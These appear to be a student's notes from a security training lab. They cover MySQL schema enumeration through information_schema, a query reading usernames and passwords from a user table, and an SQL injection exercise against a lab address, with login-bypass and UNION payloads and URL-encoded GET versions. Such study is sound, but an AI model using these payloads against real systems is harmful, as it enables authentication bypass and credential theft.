# Commands



```
mysql
> help
> show databases ;
> use information_schema ; 
> show tables ;
> show columns from columns ;
> select table_schema,table_name,column_name from information_schema.columns ;
   * Golden Statement ^
> use session ;
> show tables ;
> show tables from session ;
  * when not using a specific database 
> select username,passwd,studentID from session.userinfo ;
> select name,cost,color from session.car ; 
> select name,size,cost from session.Tires
>
>
>
>

```


## default databases:
information_schema: the database that holds all the information pertaining to all the databases.
mysql
performance_schema



## Data structures we will be interacting with:
databse
tables
columns 

----------------------------------------------------------------------------------------------------------

  SQL Injection Validation Exercise ()
http://10.50.36.14


```
' OR 1='1

{option}' OR 1='1
```

```

{option}' UNION SELECT 1,2,3,4 #
```
* insert both into the input fileds:
  - User:
  - Pass:

* Inspect the page
  - Network
    - POST request
      - Request

* Append the the value in the request filed to the end of the URL:
  ex:
```
  http://10.50.36.14/login.php
  + username=%27+OR+1+%3D%271&passwd=%27+OR+1+%3D%271
  so...
 http://10.50.36.14/login.php?username=%27+OR+1+%3D%271&passwd=%27+OR+1+%3D%271
```

